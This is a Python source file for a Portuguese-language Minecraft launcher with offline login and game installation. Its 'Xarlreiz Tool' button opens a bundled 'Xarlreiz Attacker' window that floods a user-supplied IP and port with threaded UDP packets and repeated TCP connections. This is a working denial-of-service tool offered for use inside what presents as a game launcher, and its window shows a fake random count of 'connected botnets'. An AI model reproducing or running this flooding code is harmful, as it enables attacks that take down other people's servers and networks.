import sys
import os
import subprocess
import threading
import time
import random
import socket
import uuid

from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QPushButton, QVBoxLayout,
    QGraphicsBlurEffect, QLineEdit, QComboBox, QFileDialog, QHBoxLayout
)

from PyQt5.QtGui import QPixmap, QPainter, QImage
from PyQt5.QtCore import Qt, QRect
from minecraft_launcher_lib import install, command

# Versão do launcher
LAUNCHER_VERSION = "1.0.1"
BACKGROUND_IMAGE = "bg.png"

# Estilos centralizados
WIDGET_STYLE = """
    QPushButton, QLineEdit, QComboBox {
        background-color: rgba(0, 0, 0, 160);
        color: white;
        font-size: 16px;
        border-radius: 15px;
        padding: 5px;
    }
    QPushButton:hover {
        background-color: rgba(255, 255, 255, 40);
    }
"""

CONFIG_WIDGET_STYLE = """
    background-color: rgba(0, 0, 0, 160);
    color: white;
    font-size: 14px;
    border-radius: 10px;
    padding: 6px;
"""

# ==================== Janela de configurações ====================
class ConfigWindow(QWidget):
    def __init__(self, parent):
        super().__init__()
        self.setWindowTitle("Configurações")
        self.setFixedSize(300, 150)
        self.parent = parent
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout()
        
        self.version_label = QLabel(f"Versão do Launcher: {LAUNCHER_VERSION}")
        self.change_bg_button = QPushButton("Selecionar imagem de fundo")
        self.change_bg_button.clicked.connect(self.select_background)

        for widget in [self.version_label, self.change_bg_button]:
            widget.setStyleSheet(CONFIG_WIDGET_STYLE)

        layout.addWidget(self.version_label)
        layout.addWidget(self.change_bg_button)
        self.setLayout(layout)

    def select_background(self):
        file_name, _ = QFileDialog.getOpenFileName(
            self, "Selecionar imagem", "", "Imagens (*.png *.jpg *.jpeg)"
        )
        if file_name:
            self.parent.set_background(file_name)
            self.close()


# ==================== Interface do Xarlreiz ====================
class XarlreizAttacker:
    def __init__(self):
        self.attack_running = False
        self.udp_sent = 0
        self.tcp_sent = 0
        self.root = None
        self.packet_label = None
        self.start_button = None
        self.ip_entry = None
        self.port_entry = None

    def send_udp_packets(self, ip, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = b"A" * 1400
        
        while self.attack_running:
            try:
                for _ in range(1000):
                    sock.sendto(data, (ip, int(port)))
                    self.udp_sent += 1
            except:
                pass
            time.sleep(0.01)
        sock.close()

    def send_tcp_packets(self, ip, port):
        data = b"A" * 1400
        
        while self.attack_running:
            try:
                for _ in range(1000):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        sock.connect((ip, int(port)))
                        sock.sendall(data)
                        sock.close()
                        self.tcp_sent += 1
                    except:
                        pass
            except:
                pass
            time.sleep(0.01)

    def update_packet_label(self):
        if self.attack_running:
            total = self.udp_sent + self.tcp_sent
            self.packet_label.config(text=f"Pacotes enviados: {total}/s")
            self.udp_sent = 0
            self.tcp_sent = 0
            self.root.after(1000, self.update_packet_label)
        else:
            self.packet_label.config(text="Pacotes enviados: 0/s")

    def toggle_attack(self):
        ip = self.ip_entry.get().strip()
        port = self.port_entry.get().strip()

        if self.start_button["text"] == "Start":
            if not ip or not port:
                return
            try:
                int(port)
            except ValueError:
                return
                
            self.attack_running = True
            self.udp_sent = 0
            self.tcp_sent = 0

            threading.Thread(target=self.send_udp_packets, args=(ip, port), daemon=True).start()
            threading.Thread(target=self.send_tcp_packets, args=(ip, port), daemon=True).start()
            
            self.update_packet_label()
            self.start_button.config(text="Stop", bg="#228B22")
        else:
            self.attack_running = False
            self.start_button.config(text="Start", bg="#8B0000")

    def start_gui(self):
        import tkinter as tk
        from PIL import Image, ImageTk

        self.root = tk.Tk()
        self.root.title("Xarlreiz Attacker - 1155 do ET Edition")
        self.root.geometry("600x400")
        self.root.resizable(False, False)

        # Configurar background
        try:
            bg_image = Image.open(BACKGROUND_IMAGE).resize((600, 400))
            bg_photo = ImageTk.PhotoImage(bg_image)
            background_label = tk.Label(self.root, image=bg_photo)
            background_label.image = bg_photo
            background_label.place(x=0, y=0, relwidth=1, relheight=1)
        except:
            self.root.configure(bg="black")

        style = {"fg": "white", "bg": "#000000", "font": ("Arial", 12)}

        # Frame principal
        frame = tk.Frame(self.root, bg='#000000', bd=2)
        frame.place(x=50, y=150)

        # Elementos da interface
        ip_label = tk.Label(frame, text="IP:", **style)
        self.ip_entry = tk.Entry(frame, **style)
        port_label = tk.Label(frame, text="Port:", **style)
        self.port_entry = tk.Entry(frame, **style)

        self.start_button = tk.Button(frame, text="Start", **style, command=self.toggle_attack)
        self.start_button.config(bg="#8B0000")

        # Layout
        ip_label.grid(row=0, column=0, padx=5, pady=5)
        self.ip_entry.grid(row=0, column=1, padx=5, pady=5)
        port_label.grid(row=0, column=2, padx=5, pady=5)
        self.port_entry.grid(row=0, column=3, padx=5, pady=5)
        self.start_button.grid(row=0, column=4, padx=10)

        # Labels de status
        botnet_label = tk.Label(
            self.root, 
            text=f"Botnets conectadas: {random.randint(50000, 1000000)}", 
            fg="white", bg="#000000", font=("Arial", 10)
        )
        botnet_label.place(x=10, y=370)
        
        self.packet_label = tk.Label(
            self.root, 
            text="Pacotes enviados: 0/s", 
            fg="white", bg="#000000", font=("Arial", 10)
        )
        self.packet_label.place(x=400, y=370)

        self.root.mainloop()

def iniciar_xarlreiz():
    attacker = XarlreizAttacker()
    attacker.start_gui()

# ==================== Launcher Principal ====================
class ETLauncher(QWidget):
    def __init__(self):
        super().__init__()
        self.account = None
        self.selected_version = "1.20.1"
        self.bg_path = BACKGROUND_IMAGE
        self.config_window = None
        
        self._setup_window()
        self._setup_background()
        self._setup_ui()

    def _setup_window(self):
        self.setWindowTitle("ET Launcher - 1155 do ET")
        self.setFixedSize(800, 500)

    def _setup_background(self):
        self.bg = QImage(self.bg_path).scaled(
            self.size(), Qt.IgnoreAspectRatio, Qt.SmoothTransformation
        )
        self.panel_rect = QRect(200, 100, 400, 340)

        self.blur_label = QLabel(self)
        self.blur_label.setGeometry(self.panel_rect)
        self.blur_label.setPixmap(self._get_blurred_section(self.panel_rect))
        self.blur_label.setStyleSheet("border-radius: 20px;")

    def _setup_ui(self):
        self.container = QWidget(self)
        self.container.setGeometry(self.panel_rect)

        vbox = QVBoxLayout()
        vbox.setAlignment(Qt.AlignCenter)
        vbox.setSpacing(10)

        # Título
        title = QLabel(f"ET Launcher v{LAUNCHER_VERSION}")
        title.setStyleSheet("""
            color: #32CD32; 
            font-size: 24px; 
            font-weight: bold;
            background-color: rgba(0, 0, 0, 180);
            border-radius: 10px;
            padding: 8px 16px;
            border: 2px solid #32CD32;
        """)
        title.setAlignment(Qt.AlignCenter)

        # Elementos da interface
        self.username_input = QLineEdit()
        self.username_input.setPlaceholderText("Nome de usuário")
        self.username_input.setAlignment(Qt.AlignCenter)

        self.version_box = QComboBox()
        self.version_box.addItems(["1.8.9", "1.12.2", "1.16.5", "1.20.1"])
        self.version_box.setCurrentText(self.selected_version)
        self.version_box.currentTextChanged.connect(self._on_version_changed)

        self.login_button = QPushButton("Login Offline")
        self.play_button = QPushButton("Iniciar Minecraft")
        self.play_button.setEnabled(False)
        
        self.settings_button = QPushButton("⚙")
        self.settings_button.setFixedSize(40, 30)
        self.settings_button.setStyleSheet("font-size: 18px;")
        
        self.xarlreiz_button = QPushButton("Xarlreiz Tool")

        # Aplicar estilos
        for widget in [self.username_input, self.version_box, self.login_button, 
                      self.play_button, self.xarlreiz_button]:
            widget.setFixedHeight(40)
            widget.setStyleSheet(WIDGET_STYLE)

        # Conectar eventos
        self.settings_button.clicked.connect(self._abrir_configuracoes)
        self.login_button.clicked.connect(self._login_offline)
        self.play_button.clicked.connect(self._launch_game)
        self.xarlreiz_button.clicked.connect(iniciar_xarlreiz)

        # Layout
        top_bar = QHBoxLayout()
        top_bar.addStretch()
        top_bar.addWidget(self.settings_button)

        vbox.addLayout(top_bar)
        vbox.addWidget(title)
        vbox.addWidget(self.username_input)
        vbox.addWidget(self.version_box)
        vbox.addWidget(self.login_button)
        vbox.addWidget(self.play_button)
        vbox.addWidget(self.xarlreiz_button)

        self.container.setLayout(vbox)

    def _on_version_changed(self, version):
        self.selected_version = version

    def _abrir_configuracoes(self):
        self.config_window = ConfigWindow(self)
        self.config_window.show()

    def set_background(self, path):
        self.bg_path = path
        self.bg = QImage(self.bg_path).scaled(
            self.size(), Qt.IgnoreAspectRatio, Qt.SmoothTransformation
        )
        self.blur_label.setPixmap(self._get_blurred_section(self.panel_rect))
        self.repaint()

    def _get_blurred_section(self, rect: QRect):
        cropped = self.bg.copy(rect)
        blur_widget = QLabel()
        blur_widget.setPixmap(QPixmap.fromImage(cropped))
        blur_widget.setFixedSize(rect.size())
        
        blur = QGraphicsBlurEffect()
        blur.setBlurRadius(20)
        blur_widget.setGraphicsEffect(blur)
        
        result = QPixmap(rect.size())
        result.fill(Qt.transparent)
        blur_widget.render(result)
        return result

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.drawImage(0, 0, self.bg)

    def _login_offline(self):
        username = self.username_input.text().strip()
        if not username:
            return
            
        self.account = {
            "name": username,
            "uuid": str(uuid.uuid3(uuid.NAMESPACE_DNS, username)),
            "access_token": "0"
        }
        
        self.login_button.setText(f"Logado como {username}")
        self.username_input.setEnabled(False)
        self.login_button.setEnabled(False)
        self.play_button.setEnabled(True)

    def _launch_game(self):
        if not self.account:
            return
            
        version = self.selected_version
        mc_dir = os.path.join(os.path.expanduser("~"), ".etlauncher_minecraft")
        os.makedirs(mc_dir, exist_ok=True)
        
        options = {
            "username": self.account["name"],
            "uuid": self.account["uuid"],
            "token": self.account["access_token"],
            "jvmArguments": ["-Xmx2G", "-Xms2G"]
        }

        def run():
            try:
                install.install_minecraft_version(versionid=version, minecraft_directory=mc_dir)
                cmd = command.get_minecraft_command(version=version, minecraft_directory=mc_dir, options=options)
                subprocess.run(cmd)
            except Exception as e:
                print("Erro ao iniciar o jogo:", e)
            finally:
                # Reset button state on main thread
                self.play_button.setText("Iniciar Minecraft")
                self.play_button.setEnabled(True)
        self.play_button.setText("Iniciando...")
        self.play_button.setEnabled(False)
        threading.Thread(target=run, daemon=True).start()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    launcher = ETLauncher()
    launcher.show()
    sys.exit(app.exec_())